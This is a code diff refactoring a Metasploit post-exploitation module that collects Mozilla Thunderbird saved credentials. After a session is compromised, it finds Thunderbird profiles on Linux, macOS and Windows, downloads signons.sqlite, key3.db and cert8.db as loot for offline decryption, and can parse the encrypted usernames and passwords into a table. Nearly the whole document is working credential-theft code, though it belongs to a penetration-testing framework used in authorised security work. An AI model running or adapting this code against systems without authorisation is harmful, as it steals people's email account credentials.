@@ -1,36 +1,46 @@
 ##
-# This module requires Metasploit: http://metasploit.com/download
+# This module requires Metasploit: https://metasploit.com/download
 # Current source: https://github.com/rapid7/metasploit-framework
 ##
 
-require 'msf/core'
-
-class Metasploit3 < Msf::Post
-
+class MetasploitModule < Msf::Post
   include Msf::Post::File
   include Msf::Post::Windows::UserProfiles
 
-  def initialize(info={})
-    super(update_info(info,
-      'Name'           => "Multi Gather Mozilla Thunderbird Signon Credential Collection",
-      'Description'    => %q{
+  def initialize(info = {})
+    super(
+      update_info(
+        info,
+        'Name' => 'Multi Gather Mozilla Thunderbird Signon Credential Collection',
+        'Description' => %q{
           This module will collect credentials from Mozilla Thunderbird by downloading
-        the necessary files such as 'signons.sqlite', 'key3.db', and 'cert8.db' for
-        offline decryption with third party tools.
+          the necessary files such as 'signons.sqlite', 'key3.db', and 'cert8.db' for
+          offline decryption with third party tools.
 
-          If necessary, you may also set the PARSE optioin to true to parse the sqlite
-        file, which contains sensitive information such as the encrypted username/password.
-        However, this feature is not enabled by default, because it requires SQLITE3 gem
-        to be installed on your machine.
-      },
-      'License'        => MSF_LICENSE,
-      'Author'         =>
-        [
-          'sinn3r',  #Metasploit
+          If necessary, you may also set the PARSE option to true to parse the sqlite
+          file, which contains sensitive information such as the encrypted username/password.
+          However, this feature is not enabled by default, because it requires SQLITE3 gem
+          to be installed on your machine.
+        },
+        'License' => MSF_LICENSE,
+        'Author' => [
+          'sinn3r', # Metasploit
         ],
-      'Platform'       => %w{ linux osx win },
-      'SessionTypes'   => ['meterpreter', 'shell']
-      ))
+        'Platform' => %w[linux osx win],
+        'SessionTypes' => ['meterpreter', 'shell'],
+        'Compat' => {
+          'Meterpreter' => {
+            'Commands' => %w[
+              core_channel_eof
+              core_channel_open
+              core_channel_read
+              core_channel_write
+              stdapi_sys_config_getenv
+            ]
+          }
+        }
+      )
+    )
 
     register_options(
       [
@@ -42,19 +52,19 @@ class Metasploit3 < Msf::Post
   def run
     # Initialize Thunderbird's base path based on the platform
     case session.platform
-    when /linux/
-      user = session.shell_command("whoami").chomp
+    when 'linux'
+      user = session.shell_command('whoami').chomp
       base = "/home/#{user}/.thunderbird/"
-    when /osx/
-      user = session.shell_command("whoami").chomp
+    when 'osx'
+      user = session.shell_command('whoami').chomp
       base = "/Users/#{user}/Library/Thunderbird/Profiles/"
-    when /win/
-      if session.type =~ /meterpreter/
+    when 'windows'
+      if session.type == 'meterpreter'
         user_profile = session.sys.config.getenv('APPDATA')
       else
-        user_profile = cmd_exec("echo %APPDATA%").strip
+        user_profile = cmd_exec('echo %APPDATA%').strip
       end
-      base = user_profile + "\\Thunderbird\\Profiles\\"
+      base = user_profile + '\\Thunderbird\\Profiles\\'
     end
 
     # Now we have the path for Thunderbird, we still need to enumerate its
@@ -65,7 +75,8 @@ class Metasploit3 < Msf::Post
     # Steal!
     profiles.each do |profile|
       next if profile =~ /^\./
-      slash = (session.platform =~ /win/) ? "\\" : "/"
+
+      slash = (session.platform == 'windows') ? '\\' : '/'
       p = base + profile + slash
 
       # Download the database, and attempt to process the content
@@ -86,28 +97,26 @@ class Metasploit3 < Msf::Post
       loot = ''
 
       # Downaload the file
-      if session.type =~ /meterpreter/
+      if session.type == 'meterpreter'
         vprint_status("Downloading: #{p + item}")
         begin
           f = session.fs.file.new(p + item, 'rb')
-          until f.eof?
-            loot << f.read
-          end
+          loot << f.read until f.eof?
         rescue ::Exception => e
         ensure
           f.close
         end
-      elsif session.type =~ /shell/
-        cmd_show = (session.platform =~ /win/) ? 'type' : 'cat'
+      elsif session.type == 'shell'
+        cmd_show = (session.platform == 'windows') ? 'type' : 'cat'
         # The type command will add a 0x0a character in the file?  Pff.
         # Gotta lstrip that.
-        loot = cmd_exec(cmd_show, "\"#{p+item}\"").lstrip
+        loot = cmd_exec(cmd_show, "\"#{p + item}\"").lstrip
         next if loot =~ /system cannot find the file specified|No such file/
       end
 
       # Save it
       ext = ::File.extname(item)
-      ext = ext[1,ext.length]
+      ext = ext[1, ext.length]
 
       path = store_loot(
         "tb.#{item}",
@@ -115,26 +124,28 @@ class Metasploit3 < Msf::Post
         session,
         loot,
         "thunderbird_raw_#{item}",
-        "Thunderbird Raw File #{item}")
+        "Thunderbird Raw File #{item}"
+      )
 
       print_status("#{item} saved in #{path}")
 
       # Parse signons.sqlite
-      if item =~ /signons\.sqlite/ and datastore['PARSE']
-        print_status("Parsing signons.sqlite...")
-        data_tbl = parse(path)
-        if data_tbl.nil? or data_tbl.rows.empty?
-          print_status("No data parsed")
-        else
-          path = store_loot(
-            "tb.parsed.#{item}",
-            "text/plain",
-            session,
-            data_tbl.to_csv,
-            "thunderbird_parsed_#{item}",
-            "Thunderbird Parsed File #{item}")
-          print_status("Parsed signons.sqlite saved in: #{path}")
-        end
+      next unless item =~ (/signons\.sqlite/) && datastore['PARSE']
+
+      print_status('Parsing signons.sqlite...')
+      data_tbl = parse(path)
+      if data_tbl.nil? || data_tbl.rows.empty?
+        print_status('No data parsed')
+      else
+        path = store_loot(
+          "tb.parsed.#{item}",
+          'text/plain',
+          session,
+          data_tbl.to_csv,
+          "thunderbird_parsed_#{item}",
+          "Thunderbird Parsed File #{item}"
+        )
+        print_status("Parsed signons.sqlite saved in: #{path}")
       end
     end
   end
@@ -158,16 +169,16 @@ class Metasploit3 < Msf::Post
     begin
       columns, *rows = db.execute('select * from moz_logins')
     rescue ::Exception => e
-      print_error("doh! #{e.to_s}")
+      print_error("doh! #{e}")
       return nil
     ensure
       db.close
     end
 
     # Create a rex table to store our data
-    tbl = Rex::Ui::Text::Table.new(
-      'Header'  => 'Thunderbird login data',
-      'Indent'  => 1,
+    tbl = Rex::Text::Table.new(
+      'Header' => 'Thunderbird login data',
+      'Indent' => 1,
       'Columns' =>
         [
           'hostname',
@@ -184,14 +195,14 @@ class Metasploit3 < Msf::Post
     # Parse the db, store the data
     rows.each do |row|
       tbl << [
-        row[1],  #hostname
-        row[2],  #httpRealm
-        row[3],  #formSubmitURL (could be nil)
-        row[4],  #usernameField
-        row[5],  #passwordField
-        row[6],  #encryptedUsername
-        row[7],  #encryptedPassword
-        row[8]   #guid
+        row[1],  # hostname
+        row[2],  # httpRealm
+        row[3],  # formSubmitURL (could be nil)
+        row[4],  # usernameField
+        row[5],  # passwordField
+        row[6],  # encryptedUsername
+        row[7],  # encryptedPassword
+        row[8]   # guid
       ]
     end
 
@@ -205,18 +216,19 @@ class Metasploit3 < Msf::Post
   def get_profile_names(path)
     tb_profiles = []
 
-    if session.type =~ /meterpreter/
+    if session.type == 'meterpreter'
       session.fs.dir.foreach(path) do |subdir|
         tb_profiles << subdir
       end
     else
-      cmd = (session.platform =~ /win/) ? "dir \"#{path}\"" : "ls -ld #{path}*/"
+      cmd = (session.platform == 'windows') ? "dir \"#{path}\"" : "ls -ld #{path}*/"
       dir = cmd_exec(cmd)
       dir.each_line do |line|
         line = line.strip
-        next if session.platform =~ /win/ and line !~ /<DIR>((.+)\.(\w+)$)/
-        next if session.platform =~ /linux|osx/ and line !~ /(\w+\.\w+)/
-        tb_profiles << $1 if not $1.nil?
+        next if session.platform == 'windows' && line !~ /<DIR>((.+)\.(\w+)$)/
+        next if (session.platform == 'linux' || session.platform == 'osx') && line !~ /(\w+\.\w+)/
+
+        tb_profiles << ::Regexp.last_match(1) if !::Regexp.last_match(1).nil?
       end
     end
     return tb_profiles
